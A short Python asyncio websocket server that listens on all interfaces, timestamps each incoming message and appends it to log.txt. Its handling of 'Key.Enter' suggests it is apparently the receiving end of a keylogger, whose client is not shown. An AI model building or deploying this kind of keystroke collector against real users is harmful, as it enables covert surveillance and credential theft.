import asyncio
import websockets
from datetime import datetime

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    ORANGE = '\033[38;5;208m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    MAGENTA = '\033[95m'
    UNDERLINE = '\033[4m'


async def server(websocket):
    message = await websocket.recv()
    print(bcolors.ORANGE + "[" + str(datetime.now()) + "]" + bcolors.ENDC + f"Server Recieved: {message}!")
    with open('log.txt', 'a') as file:
        if(message == "Key.Enter"):
            file.write("\n")
        else:
            file.write(message)

async def main():
    stop_server = False  # Your condition flag
    async with websockets.serve(server, "0.0.0.0", 8765):
        print("WebSocket server started and listening on 0.0.0.0:8765")
        
        while not stop_server:
            # Check your condition here (could be from a queue, external signal, etc.)
            # For example, check a file,  database, or global variable
            await asyncio.sleep(1)  # Check condition every second


if __name__ == "__main__":
    asyncio.run(main())